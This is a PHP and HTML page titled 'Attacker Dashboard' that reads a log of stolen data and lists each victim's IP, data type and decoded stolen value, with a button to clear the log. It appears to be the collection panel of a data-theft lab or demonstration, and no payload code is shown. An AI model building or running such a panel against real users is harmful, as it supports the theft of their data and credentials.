<?php
$log_file = 'stolen_data.log';

if (isset($_GET['clear']) && $_GET['clear'] === 'true') {
    file_put_contents($log_file, '');
    header('Location: index.php');
    exit;
}

$logs = file_exists($log_file) ? file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attacker Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #212529; color: #f8f9fa; }
        .table { color: #f8f9fa; }
        .card { background-color: #343a40; border-color: #495057; }
    </style>
</head>
<body>
    <div class="container py-5">
        <div class="d-flex justify-content-between align-items-center mb-4">
            <h1 class="fw-bold">Attacker Dashboard</h1>
            <a href="index.php?clear=true" class="btn btn-danger">Clear Logs</a>
        </div>

        <div class="card shadow-sm">
            <div class="card-body">
                <h5 class="card-title mb-3">Stolen Data</h5>
                <div class="table-responsive">
                    <table class="table table-dark table-striped table-hover">
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Victim IP</th>
                                <th>Data Type</th>
                                <th>Stolen Data</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach (array_reverse($logs) as $log): ?>
                                <?php $data = json_decode($log, true); ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($data['timestamp'] ?? '', ENT_QUOTES, 'UTF-8'); ?></td>
                                    <td><?php echo htmlspecialchars($data['ip'] ?? '', ENT_QUOTES, 'UTF-8'); ?></td>
                                    <td><?php echo htmlspecialchars($data['type'] ?? '', ENT_QUOTES, 'UTF-8'); ?></td>
                                    <td><pre class="mb-0"><?php echo htmlspecialchars(base64_decode($data['value'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></pre></td>
                                </tr>
                            <?php endforeach; ?>
                            <?php if (empty($logs)): ?>
                                <tr>
                                    <td colspan="4" class="text-center">No data stolen yet.</td>
                                </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
